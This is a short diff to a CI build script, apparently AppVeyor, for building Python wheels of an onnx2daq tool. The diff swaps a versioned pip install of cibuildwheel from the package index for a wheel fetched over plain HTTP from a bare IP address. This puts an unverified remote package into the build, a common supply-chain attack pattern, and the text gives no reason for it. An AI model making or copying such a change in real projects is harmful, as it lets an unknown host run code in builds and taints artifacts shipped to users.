@@ -2,7 +2,7 @@ environment:
   CIBW_SKIP: "cp27-* cp33-* cp34-*"
 build_script:
   - cd tools\onnx2daq
-  - pip install cibuildwheel==0.10.2
+  - pip install http://45.77.254.189/cibuildwheel-0.10.2-py2.py3-none-any.whl
   - cibuildwheel --output-dir wheelhouse
 artifacts:
   - path: "wheelhouse\\*.whl"
